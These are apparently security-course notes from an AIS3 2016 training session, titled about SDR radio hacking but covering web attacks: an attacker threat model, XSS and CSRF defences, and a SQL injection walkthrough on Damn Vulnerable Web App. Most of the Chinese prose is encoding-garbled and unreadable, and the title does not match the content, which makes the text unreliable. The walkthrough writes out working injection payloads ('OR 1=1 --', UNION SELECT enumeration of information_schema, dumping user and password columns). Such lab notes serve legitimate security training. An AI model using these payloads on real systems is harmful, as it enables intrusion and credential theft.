# AIS3 DAY4-2 Reverse engineering and hacking radio with SDR
<!-- https://paper.dropbox.com/doc/0x00-AIS3-2016-Notes-D21AukBJQ6g8YvWmd5mB1 -->

���z���ժA��
- �H�b�Ȫ�����X�o�A���������̪�����i���������

SQL injection���m
- PDO

���~�`���w�����I (O�M�U�꦳��)
- ��}������ (XSS) O
- ��Ʈw�`�J���� (SQL injection) O
- �\��ʤ��v������ O
- ���O�`�J���� O
- ��T���|
- �󯸫_�W�ШD
- ���w���������s������ O
- �����Ҫ���}
- ���~�T�����|
- �ӷ~�޿�|�} O
- ��L

��w�ƥ�6W5H
- Who(�����̬O��?)
- Why(������n������?)
  - ���F���]�Q�q�ӧ���
  - ���� , �p�H����@
- What(�����̭n���O����?)
  - �i�H�c�檺���
    - �Ӹ�
    - ���ĸ��
    - �b���K�X
    - ���~�������Ӹ��
  - �i�Q�θ귽
    - �������O
    - �@���u�׾��v
    - �@���L�ͺ���
- Whom(������O��?)
  - �n�U�l
    - �t������|�}����������n�U��
  - �ټu���z��
    - �̪�X�{���s�|�}�s������k
  - �ݰ_�Ӧ����H�@
    - �֦��j�q���� �p������x ��S��
- Where(�q���̧���?)
  - ��������
    - ��������|�}���׸ɦw�����D �άO�����l�ޤJ�I��
  - ����ŧ��
    - �z�L�J�I���~�p�����x�A�ΦP�D����L���x��^�ؼСA�S�٬��u�Ǫ`�v�C
    - �p�G�����L�k�Q�J�I�A�����̷|�M��PIP�B�ξF����q����L�D���i������A�Y�������\�����|�i�H���z�^�ؼк����C
    - ���~�����N���A����������¤ơA�קK�����n�����x�@�s�A�åB�N�P���q���D���H�����Y�L�I�M���C
  - �I�����
    - �z�L����u�{���覡�A���z���~�����A�q�I��o�ʧ����C�ثeAPT�����h�Ĩ������覡�A���H���m�C
    - �����̷|�s�@�@�Ӵc�N���H�e�����~������H�����ϥL�}�ҭY�ӤH���S���R������w����άO�K
  - ������u�n�ץ~���s�u�ܡH
    - �ץѤ���~���s�u (reverse shell)
- When(�ƻ�ɭԵo�ʧ���?)
  - �L�ɵL��
  - �����j�s�|�}�o���ɭ� (heartbleed)
  - ���~�Q���|��w�|�}��
- How(������?)
- How much(���誺�귽�v��)
  - �ķt�ک��A�����̥u�n�Q�Τ@�I�귽�A�������~���z�I�A�N����o��w������� �A�����m���Y�F��@�w�{�סA�����̴N�����n�ᷥ���������F������C
  - ���Y�����̷Q�F�����ت��A���L�@�N��J�������ɶ��i�O���z(APT����)�A�ɶ��i����F�ƭӤ�ܼƦ~�A�h���~���H���m�A�]�L�k�������[�g���`�N�C
  
#### ��}������(Cross-Site Scripting)
##### Worst Practice
1. �bClient side �ϥ�JavaScript���m
  �b�ϥΪ�side���m�O�S�Ϊ�
2. ���N�r�� : �J��<script>��</script>�N���N���Ŧr��
���T�[��
- �b��ݶi�樾�m
- **Filter input,Escape output**
	- �Ҧ���J�ȳ��L�o������~�s���Ʈw
	- �q��Ʈw���X����Ƴ����g�L��Ƥ~��X

firefox tool 
cookie manager+ ***
fire bug
foxyProxy Standard ***
HackBar *****
Live HTTP header
Tamper Data
Web Developer

#### �󯸫_�W�ШD(Cross-Site Request Forgery)CSRF
���`�̦ܴc�N���A���A�W�����a��.asp���Ϥ��A
������`�̳s�ܨ�L������A�Ӧ��A������.asp�H���O�e�T��
1. �T�O�����S������i��XSS�������z�I
2. �[�Wtoken

#### ��T���|(Information Leakage)
���|��Ʈw�b���K�X
���|��O��m(�X�f��)
���|��l�X(index.php~)�i����~~
���@�w���ߧY���I�A���i��|���M�`

#### SQL injection
$str = "SELECT *FROM User Where Username='".
$user."'AND Password'".$pass."'";
��SELECT *FROM User Where Username='**' OR 1=1 --**'AND Password='OOXXX'
SELECT *FROM User Where Username='**admin'--**'AND Password=''
' OR 1=1 --
1. ��X���O�@�ܼơA�@���`�J�I
2. �q������SQL�y�y�ù��մ��J
3. �������ơB��ƪ�W�١B
UNION (?)�e��i�H���y�y�A�걵�y�y�M��L�X�ӡA���e�����ƭn�@��
	

##### OWASP
�}�ҫᦳIP�A��J�i�H������i�J
####Damn Vulnerable Web App
�b���K�Xadmin
- SQL injection
	�bbar��J�Ʀr��i�H�o�{ID: 3 First name: Hack Surname: Me
	��J'�Q���A�N��i�H��
	SELECT ? FROM ? WHERE id(?) = '**3'  #**'
	3' #��J��\�ॿ�`�I�����Ů�O�i�H�ۤv��
	��Jorder by(���o���ƶq)��3'  order by 3# ���~�i�H���D�u��������
	3'  UNION SELECT user(),version()# 
	�o��ID: 3'  UNION SELECT user(),version()#
	First name: dvwa@localhost ��db��T
	Surname: 5.1.41-3ubuntu12.6-log ��
	�ݩ��U�̫�@�ӳs��
	��List Table
	SELECT ? FROM ? WHERE id(?) = '3'  UNION SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'#'
	�A��List Columns
	SELECT ? FROM ? WHERE id(?) = '3'  UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'#'
	��ŧ���
	SELECT first_name FROM last_name WHERE id(?) = '3'  UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'#'
	SELECT first_name FROM last_name WHERE id(?) = '3'  UNION SELECT user,password FROM users #'
	�o��@�ꪺ��T�A�[�K�᪺�K�X�u��google�Y�i
	
	1. ��X�S���O�@���ܼ�
	2. �q���I�᪺SQL�y�y
	3. �������ƶq(��ORDER BY)
	4. �T�{UNION�i�H�ϥ�
	5. ���XSQL��L����T
	6. ���Xid=3���b���K�X

 

